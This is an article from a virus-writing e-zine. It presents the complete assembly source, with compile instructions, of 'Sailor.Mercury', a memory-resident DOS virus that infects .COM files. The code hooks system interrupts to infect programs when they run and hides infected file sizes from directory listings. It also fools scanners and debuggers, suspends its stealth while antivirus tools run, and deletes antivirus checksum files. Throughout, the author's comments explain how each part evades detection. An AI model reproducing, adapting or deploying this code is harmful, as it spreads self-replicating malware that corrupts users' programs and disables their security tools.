   ;                                        /-----------------------------\
   ;                                        | Xine - issue #1 - Phile 019 |
   ;                                        \-----------------------------/
   ; XINE-1.019

   ;
   ;
   ;                           b0z0 of the -iKx-
   ;                                present
   ;                             Sailor.Mercury
   ;
   ;  hyo guys
   ; this is my first virus that i release to the public... so don't be too
   ; hard when feedbacking something :) Sailor.Mercury is the first virus of
   ; the Pretty Soldiers Sailor family... if you dunno who the Pretty Soldiers
   ; are then  IN THE NAME OF THE MOON I'LL PUNISH YOU! :)
   ; i hope to be around enough to complete all the family... we'll see ;)
   ;  the code in some parts isn't optimized at all. infact like you will notice
   ; at the comments i scrambled a little some passes to hide some heuristic
   ; flags from the various lame avs. the virus isn't encrypted... that's simply
   ; because i am not in this moment able to write a decent encryption engine...
   ; i tried with some standard xor and so on but this only gave a lot of
   ; warnings. and anyway the avs will put the decrypt procedure as a search
   ; string in the same manner that they will put a piece of the unencrypted
   ; virus... all the length stealth routines are based only on the check of
   ; the file size (must be < 64k of course) and file time (30 secs).
   ;
   ; And now as usual some tech infos about the virus:
   ;  - TSR .com infector
   ;  - infects on execute (4bh)
   ;  - infects files longer than 1024 and shorter than 64000
   ;  - stealth features (disabled when AVP or FPROT or tools like
   ;                      CHKDSK or SCANDISK are running)
   ;       * fcb stealth (on 11h/12h)
   ;       * dta stealth (on 4eh/4fh)
   ;       * get/set interrupt 21h stealth (on 3521h/2521h)
   ;       * size stealth on lseek calls 4202h (when seeking from end)
   ;  - general int24h error handler
   ;  - some retro structures
   ;       * deletes msd0g chklist.ms on each succesfull infection
   ;       * deletes tbav checksums
   ;  - antibait code
   ;       * doesn't infect files created today (checking only day, no mnth...)
   ;       * doesn't infect files which lenght is divisible by 512
   ;       * doesn't infect files which lenght is divisible by 1000
   ;  - antidebug code
   ;
   ; To compile:
   ;  TASM /M2 MERCURY.ASM
   ;  TLINK /T MERCURY
   ;
   ;

   mercury         segment
                   assume cs:mercury,ds:mercury,es:mercury

                   org     100h
   start:
                   call    tbscan                  ;final fool for tbscan :)
                   call    antidebug               ;fool fprot
                   call    delta                   ;calculate delta offset
   delta:
                   mov     bp,sp
                   mov     bx,[bp]
                   mov     bp,bx
                   sub     bp,offset delta         ;calculate delta offset
   res_check:
                   mov     ax,3726h                ;installation check
                   int     21h
                   cmp     ax,374ch
                   jnz     go_resident
                   call    restore_COM             ;restore the original com
   go_resident:
                   push    cs
                   mov     ax,3521h                ; get int 21 adress
                   int     21h
                   mov     word ptr [bp + old_int21_off],bx
                   mov     word ptr [bp + old_int21_seg],es
                   pop     es

                   mov     ah,4ah              ;request too much mem
                   mov     bx,0ffffh
                   int     21h                 ;in BX max mem avaiable

                   sub     bx,((end_vir-start+0fh)/10h)+1   ;shrink block
                   mov     ah,4ah
                   int     21h                            ;ES = block segment

                   mov     ah,48h
                   mov     bx,((end_vir-start+0fh)/10h)  ;allocate needed mem
                   int     21h                           ;AX = free segment

                   dec     ax
                   mov     es,ax                         ;ES = new MCB

                   push    es
                   push    ax
                   mov     ax,cs
                   dec     ax                       ;MCB of the previous block
                   mov     es,ax
                   mov     byte ptr es:[0],'Z'      ;mark the previous as the last
                   pop     ax                       ;so mem /debug won't see us
                   pop     es

                   mov     si,offset start          ;ds:si = virus
                   add     si,bp
                   sub     ax,0fh
                   mov     es,ax                    ;es:di = place for the virus
                   mov     di,0ffh                  ;ds:si --> es:di
                   inc     di                       ;damn tbscan :)
                   mov     cx,offset end_vir - offset start
                   cld
                   rep     movsb   ; Copy the virus
                   push    es

                   mov     ax,2621h        ; install our interrupt handler
                   dec     ah              ; fuck TBSCAN memres scan flag
                   pop     ds
                   mov     dx,[offset int21_handler]
                   int     21h
   restore_COM:
                   pop     es              ;this adjust the stack from the
                                           ;calculation of the delta offset
                                           ;anyway i think that anything would
                                           ;work also fine without this
                   push    cs              ;give again control to the program
                   pop     es
                   push    es
                   pop     ds
                   mov     di,0ffh         ;like mov di,100h but in this
                   inc     di              ;way tbscan won't issue 'O' flag
                   lea     si,[bp+old_jump] ;restore first four bytes
                   push    di
                   movsw
                   movsw
                   pop     ax
                   jmp     ax
   lsend:
                    pushf
                    push   cs                    ;we must return home later :)
                    call   doint21               ;do the int21h
                    jc     notnf
                    cmp    dx,00h
                    jnz    notnf                 ;COMs are < 65k so if dx<>0 then
                                                 ;maybe isn't a .COM
                    push   ax                    ;save length infos
                    push   cx
                    push   dx
                    mov    ax,5700h              ;get date-time
                    int    21h
                    and    cl,1fh                ;our time-marker?
                    xor    cl,0fh
                    pop    dx
                    pop    cx
                    pop    ax                    ;restore infos
                    jnz    notnf                 ;if not infected leave
                    sub    ax,(end_vir-start)    ;is infected? hide the size!
   notnf:
                    retf 2
   fcbstealth:
                   pushf
                   push    cs
                   call    doint21
                   or      al,al                     ;dir sucessfull??
                   jnz     leave_dir                 ;no? leave all

                   push    es
                   push    bx
                   push    ax
                   mov     ah,51h                    ;get psp
                   int     21h
                   mov     es,bx
                   cmp     bx,es:[16h]               ;is the PSP ok??
                   jnz     error

                   mov     bx,dx
                   mov     al,[bx]                   ;al<--current drive
                   push    ax                        ;look 4 extended FCB
                   mov     ah,2fh                    ;get dta area
                   int     21h
                   pop     ax
                   inc     al                       ;=ffh
                   jnz     no_ext                   ;extended fcb?
                   add     bx,7
   no_ext:
                   cmp     word ptr es:[bx+1fh],00h             ;is > 65k?
                   jnz     error                                ;yup.. leave
                   mov     al,byte ptr es:[bx+17h]   ;seconds field
                   and     al,1fh
                   xor     al,0fh                    ;is file infected?
                   jnz     error
   hide:
                   sub     word ptr es:[bx+1dh],(end_vir-start) ;hide size
   error:
                   pop     ax
                   pop     bx
                   pop     es
   leave_dir:
                   retf    2
   int21_handler:
                   cmp     ax,3726h                ;installation check
                   jne     no_check
                   add     al,al
                   iret
   no_check:
                   cmp     ah,32h
                   jne     dsnn
                   mov     byte ptr cs:[disste],00h
   dsnn:
                   cmp     ah,4ch          ;program ending?
                   je      re_stealth      ;reput stealth if we disabled it

                   cmp     byte ptr cs:[disste],01h   ;if AVs runs disable
                   je      doint21                    ;stealth/infect


                   push    bx
                   mov     bh,12h          ;bye bye tbscan X flag :)
                   cmp     ah,bh
                   pop     bx
                   je      fcbstealth

                   cmp     ah,11h
                   je      fcbstealth

                   cmp     ax,4202h
                   jne     nofend
                   cmp     cl,4dh          ;is our call?
                   jne     nofend
                   jmp     lsend
   nofend:
                   cmp     ax,3521h                   ;get int21h stealth
                   je      reqint21

                   cmp     ax,2521h                   ;set int21h stealth
                   je      setint21

                   cmp     ah,4eh
                   je      dtastealth

                   cmp     ah,4fh
                   je      dtastealth

                   push    bx
                   mov     bh,4bh          ;re-g'bye tbscan ];)
                   cmp     ah,bh
                   pop     bx
                   je      infect
   doint21:
                   jmp cs:old_int21
   old_int21 label dword
   old_int21_off      dw   ?                       ;original int21 offset
   old_int21_seg      dw   ?                       ;original int21 segment

   reqint21:
                   mov    es,word ptr cs:[old_int21_seg]   ;give original int21h
                   mov    bx,word ptr cs:[old_int21_off]   ;instead of our
                   iret
   setint21:
                   mov    word ptr cs:[old_int21_seg],ds   ;we will stay always
                   mov    word ptr cs:[old_int21_off],dx   ;on the top :)
                   iret
   re_stealth:
                   mov    byte ptr cs:[disste],00h         ;reenable stealth
                   jmp    cs:old_int21
   dtastealth:
                   pushf
                   push    cs             ;save for the return
                   call    doint21        ;do the call
                   jc      nomatches

                   pushf
                   push    ax
                   push    es
                   push    bx

                   mov     ah,2fh         ;open dta
                   int     21h

                   cmp     word ptr es:[bx+1ch],00h     ;is file > 64k?
                   jnz     not_inf                      ;yup.. isn't a COM
                   mov     ax,es:[bx+16h]               ;file time secs
                   and     al,1fh
                   xor     al,0fh
                   jnz     not_inf                      ;is our marker?
                   sub     es:[bx+1ah],(end_vir-start)  ;hide file size
   not_inf:
                   pop     bx
                   pop     es
                   pop     ax
                   popf
   nomatches:
                   retf 2
   infect:
                   pushf
                   push    ax
                   push    bx
                   push    cx
                   push    dx
                   push    es
                   push    ds
                   push    bp
                   push    si
                   push    di

                   push    ds
           push    dx
                   mov     ax,3524h          ;get int24h seg and off
           int     21h
                   mov     word ptr cs:[old_int24_off],bx  ;store them
                   mov     word ptr cs:[old_int24_seg],es

                   push    cs
           pop     ds
                   mov     dx,offset int24_handler         ;put our int24h
           mov     ax,2524h
           int     21h
                   pop     dx
                   pop     ds

                   push    di
                   push    dx
                   pop     di
   sloop:
                   inc     di
                   cmp     byte ptr ds:[di],'.'
                   jne     sloop                   ;search for '.'
                   sub     di,02h
                   cmp     word ptr ds:di,'PV'     ;is AVP?
                   jne     protest
   avrun:
                   mov     byte ptr cs:[disste],01h ;yup... so disable get/set
                   jmp     ahead                    ;interrupt stealth so he
   protest:                                         ;would notice us
                   cmp     word ptr ds:di,'OR'     ;is AVPRO?
                   je      avrun
                   cmp     word ptr ds:di,'TO'     ;is f-prot running?
                   je      avrun                   ;so it won't find us
   ahead:
                   pop     di
                   mov     ax,4300h           ;get file attributes
                   int     21h

                   push    cx                 ;save attributes
                   push    ds
                   push    dx
                   sub     cx,cx
                   call    set_attr           ;erase all attributes

                   mov     ax,3d02h                ;open file for rw
                   int     21h
                   jnc     continue
                   jmp     exit_infect2
   continue:
                   mov     bx,ax                   ;bx<--file handle
                   push    cs
                   pop     ds

                   mov     ax,5700h              ;get date-time
                   int     21h
                   push    cx                    ;store date/time on stack
                   push    dx

                   push    dx
                   mov     ah,2bh                ;get today's date
                   dec     ah                    ;hiho tbscan ;)
                   int     21h
                   pop     cx
                   and     cl,01fh               ;take only day from full date
                   cmp     cl,dl                 ;is the same as today?
                   jz      exitjump              ;hmmm... maybe a bait...

                   mov     ah,3fh                  ;read from file
                   mov     cx,4                    ;four bytes
                   mov     dx,offset old_jump      ;in our buffer
                   int     21h

                   cmp     byte ptr old_jump,'M'    ;exe?
                   je      exitjump
                   cmp     byte ptr old_jump,0e9h    ;is there a jump?
                   jne     goahead
                   cmp     byte ptr old_jump+3,26h   ;is our marker?
   exitjump:
                   je      exit_infect
   goahead:
                   push    dx
                   sub     cx,cx
                   lea     dx,crca
                   call    retro
                   lea     dx,crcb
                   call    retro
                   pop     dx

                   mov     cl,4dh                  ;our marker
                   mov     ax,4202h                ;go to the end of the file
                   cwd
                   sub     cx,cx
                   int     21h

                   cmp     ax,0fa00h               ;don't infect files >64000
                   ja      exit_infect

                   cmp     ax,1024                 ;don't infect files <=1024
                   jbe     exit_infect

                   mov     cx,ax
                   and     cx,01ffh                 ;if divisible by 512 leave
                   jz      exit_infect              ;it's, probably a bait!

                   push    ax
                   mov     cx,1000                 ;is length divisible by 1000??
                   div     cx                      ;hmmm suspicious... there is
                   or      dx,dx                   ;a bait near here... :)
                   pop     ax
                   jz      exit_infect

                   sub     ax,3
                   mov     word ptr new_jump + 1, ax       ;calculate new jump

                   mov     ah,3fh                          ;copy da virus
                   inc     ah
                   mov     cx,(end_vir-start)
                   mov     dx,offset start
                   int     21h

                   xor     al,al                           ;go at start
                   mov     ah,42h
                   cwd
                   mov     cx,0
                   int     21h

                   mov     cx,4                            ;copy new jump
                   mov     ah,3fh                          ;at the start
                   inc     ah
                   mov     dx,offset new_jump
                   int     21h

                   pop     dx              ;restore date/time from stack
                   pop     cx
                   mov     ax,5601h        ;set date
                   inc     ah              ;damn tbscan
                   and     cl,0e0h         ;marker for fcb stealth
                   add     cl,0fh
                   int     21h

                   push    ds              ;correct stack if not infection
                   push    bx              ;occoured
   exit_infect:
                   pop     bx
                   pop     ds
                   mov     ah,3eh          ;close file
                   int     21h
   exit_infect2:
                   pop     dx              ;restore file attributes
                   pop     ds
                   pop     cx
                   call    set_attr        ;reput old file attributes

                   mov     ax,2524h
                   mov     ds,cs:[old_int24_seg]
                   mov     dx,cs:[old_int24_off]
                   int     21h                     ; restore int24h

                   pop     di              ;restore registers
                   pop     si
                   pop     bp
                   pop     ds
                   pop     es
                   pop     dx
                   pop     cx
                   pop     bx
                   pop     ax
                   popf
                   jmp     doint21
   old_jump           db   0cdh,20h,00h,00h        ;old com jump
   virus              db   0,'Sailor.Mercury',0
   author             db   '-b0z0/iKx-',0
   new_jump           db   0e9h,00h,00h,26h        ;space for the new jump + mark
   set_attr:
                   mov     ax,4201h            ;set attributes
                   inc     ah                  ;fuck tbscan F flag
                   int     21h
                   ret
   tbscan:
                   mov     ax,0305h                ;fool tbscan :)
                   sub     bx,bx
                   int     16h                     ;the final shoot for it ;)
                   ret
   antidebug:
                   mov     cx,0aebh                ;prevent debugging
                   inc     bp                      ;shit for fprot :)
                   mov     ax,0fe05h
                   jmp     $-2
                   add     ah,03bh
                   jmp     $-11
                   int     21h
                   ret
   int24_handler:
                   mov     al,03h
                   iret
   retro:
                   call    set_attr                ;deletes file in ds:dx
                   mov     ah,41h
                   int     21h
                   ret

   crca    db      'ANTI-VIR.DAT',0    ;what will we delete ;)
   crcb    db      'CHKLIST.MS',0      ;the only 2 that i saw in to be used
   end_vir:

   disste             db   00h         ;get/set int enable/disable
   old_int24_off      dw   ?                       ;original int24 offset
   old_int24_seg      dw   ?                       ;original int24 segment

   mercury ends
   end     start
